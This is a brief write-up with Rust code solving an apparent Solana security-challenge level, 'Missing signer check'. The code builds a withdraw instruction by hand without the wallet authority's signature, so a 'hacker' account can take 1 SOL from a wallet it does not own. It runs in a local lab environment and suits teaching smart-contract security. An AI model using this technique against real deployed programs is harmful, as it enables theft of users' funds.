# Solution - Missing signer check

```rust
use borsh::BorshSerialize;
use level1::WalletInstruction;
use solana_program::instruction::{AccountMeta, Instruction};

fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let tx = env.execute_as_transaction(
        // we construct the instruction manually here
        // because the level1::withdraw function sets the is_signer flag on the authority
        // but we don't want to sign 
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(challenge.wallet_address, false),
                AccountMeta::new(challenge.wallet_authority, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Withdraw { amount: sol_to_lamports(1.0) }.try_to_vec().unwrap(),
        }],
        &[&challenge.hacker],
    );
    tx.print_named("haxx");
}
```